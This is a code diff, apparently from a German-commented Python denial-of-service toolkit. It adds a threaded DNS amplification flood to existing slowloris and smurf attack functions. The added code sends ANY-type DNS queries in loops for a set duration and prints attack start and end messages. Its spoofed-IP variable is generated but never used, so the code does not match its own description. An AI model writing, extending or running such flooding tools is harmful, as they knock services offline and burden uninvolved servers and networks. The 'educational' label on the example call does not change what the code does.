@@ -138,7 +138,7 @@ def slowloris(ip, port):
             except:
                 sockets.remove(sock)
 
-# Smurf Attack
+# Smurf Attack, 19
 from struct import pack
 from random import randint
 from ctypes import Structure, c_ubyte, c_ushort, c_uint
@@ -237,6 +237,56 @@ def smurf_attack(target_ip, broadcast_ip, duration, threads):
 
 # Beispielaufruf (nur für Bildungszwecke):
 # smurf_attack("192.168.1.10", "192.168.1.255", 10, 4)
+
+# DNS Amplification
+
+def send_dns_query(ip, dns_query):
+    """Sendet eine einzelne DNS-Anfrage an den angegebenen Server."""
+    try:
+        # UDP-Socket erstellen
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        
+        # Zufällige Quell-IP simulieren (Spoofing ist hier theoretisch)
+        spoofed_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        
+        # DNS-Anfrage senden
+        sock.sendto(dns_query, (ip, 53))
+    except Exception as e:
+        print(f"Fehler beim Senden der Anfrage: {e}")
+    finally:
+        sock.close()
+
+def attack_thread(ip, dns_query, duration):
+    """Führt den Angriff in einem Thread aus."""
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        send_dns_query(ip, dns_query)
+
+def dns_amplification_attack(ip, duration, threads):
+    """
+    Führt einen DNS-Amplification-Angriff aus.
+    :param ip: Ziel-IP-Adresse (DNS-Server)
+    :param duration: Dauer des Angriffs in Sekunden
+    :param threads: Anzahl der Threads
+    """
+    # Beispiel DNS-Anfrage mit "ANY"-Typ, um große Antworten zu erzwingen
+    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+                 b"\x07example\x03com\x00\x00\xff\x00\x01")  # Typ "ANY"
+
+    print(f"Start des DNS-Amplification-Angriffs auf {ip} für {duration} Sekunden mit {threads} Threads.")
+    
+    # Threads starten
+    thread_list = []
+    for _ in range(threads):
+        thread = threading.Thread(target=attack_thread, args=(ip, dns_query, duration))
+        thread_list.append(thread)
+        thread.start()
+
+    # Auf Threads warten
+    for thread in thread_list:
+        thread.join()
+
+    print("Angriff beendet.")
 
 # Menü zur Farbauswahl
 def choose_color():
